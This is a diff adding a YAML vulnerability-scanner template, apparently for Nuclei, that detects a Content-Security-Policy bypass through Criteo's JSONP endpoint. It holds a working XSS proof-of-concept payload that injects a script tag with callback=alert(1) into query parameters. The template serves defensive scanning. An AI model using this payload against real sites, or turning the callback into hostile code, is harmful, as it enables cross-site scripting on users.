@@ -1,0 +1,45 @@
+flow: http(1) && headless(1)
+headless:
+- fuzzing:
+  - fuzz:
+    - '{{url_encode(injection)}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - dsl:
+    - criteo_cas_csp_xss == true
+    type: dsl
+  payloads:
+    injection:
+    - <script src="https://cas.criteo.com/delivery/0.1/napi.jsonp?zoneid=377600&callback=alert(1)"></script>
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}'
+  - action: waitdialog
+    args:
+      max-duration: 5s
+    name: criteo_cas_csp_xss
+http:
+- matchers:
+  - condition: and
+    internal: true
+    part: header
+    type: word
+    words:
+    - Content-Security-Policy
+    - criteo.com
+  method: GET
+  path:
+  - '{{BaseURL}}'
+id: criteo-cas-csp-bypass
+info:
+  author: renniepak,DhiyaneshDK
+  metadata:
+    verified: true
+  name: Content-Security-Policy Bypass - Criteo CAS
+  reference:
+  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  severity: medium
+  tags: xss,csp-bypass,criteo-cas,vuln
